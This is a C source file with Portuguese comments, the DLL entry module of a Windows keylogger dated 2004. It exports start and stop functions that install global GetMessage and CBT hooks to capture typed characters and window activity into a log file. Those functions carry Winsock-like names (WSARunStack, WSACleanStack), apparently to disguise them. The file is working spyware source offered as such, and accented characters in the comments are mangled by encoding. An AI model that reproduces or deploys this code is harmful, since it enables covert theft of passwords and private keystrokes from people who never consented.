/*++ 

  Nome do m�dulo:
  
	dllmain.c

  Descri��o:

	Este c�digo fonte cont�m fun��es exportadas para inicar/parar
	a keylogger. Tais fun��es tamb�m chamam outras fun��es para
	trabalhar com hooks e arquivos de logs.

  Autor:

	Daniel Koch (Backz)

  Hist�rico:

	Maio-2004 Daniel K.
		Criado.

	15-Maio-2004 Daniel K.
		Vers�o 0.2 totalmente em portugu�s (leia o changelog).

--*/

#include <windows.h>
#include "dllmain.h"
#include "hook_manip.h"
#include "../common/show_error.h"

static HINSTANCE hInstance;

// fun��o principal da DLL
BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved)
{
	switch(fdwReason)
	{
	
	// caso a dll for chamada por um processo
	case DLL_PROCESS_ATTACH:
		{
			hInstance = hinstDll;
			// desabilitar o DLL_THREAD_ATTACH e o DLL_THREAD_DETACH
			// j� que a DLL n�o ir� ser chamada assim
			DisableThreadLibraryCalls(hinstDll);
		}
		break;

	// caso a dll for chamada por um thread
	case DLL_THREAD_ATTACH:
		break;

	// caso a dll for descarregada por um processo
	case DLL_PROCESS_DETACH:
		break;

	// caso a dll for descarregada por um thread
	case DLL_THREAD_DETACH:
		break;

	}

	return TRUE;
}


// para iniciar a keylogger 
// esta fun��o retorna TRUE se funcionar, FALSE caso contr�rio
BOOL CALL WSARunStack(const char *log_filename_ent, BOOL show_error_reason)
{

	// ativando mensagens de erro (ou n�o)
	set_show_error(show_error_reason);

	// criando e testando a hook pra mensagens do windows
	// usado na captura de WM_CHAR e WM_KEYUP
	if(!create_GetMessage_hook(hInstance,log_filename_ent))
	{
		show_last_hook_errors();
		return FALSE;
	}

	// criando e testando a hook para CBT
	// usado na captura de janelas
	if(!create_CBT_hook(hInstance))
	{
		show_last_hook_errors();
		return FALSE;
	}

    return TRUE;
}

// para parar a keylogger 
// deve retornar TRUE se funcionar, FALSE caso contr�rio
BOOL CALL WSACleanStack(void)
{
	BOOL result = TRUE;
	HHOOK *message_hook, *cbt_hook;

	// para checar se as hooks estao ativas
	message_hook = return_message_hook();
	cbt_hook = return_cbt_hook();
	
	// p�ra a hook de mensagens do windows 
	if(message_hook != NULL)
	{
		if(!destroy_GetMessage_hook())
			result = FALSE;
		
	}

	// p�ra a hook de CBT (janelas)
	if(cbt_hook != NULL)
	{
		if(!destroy_CBT_hook())
			result = FALSE;
	}

	return result;
}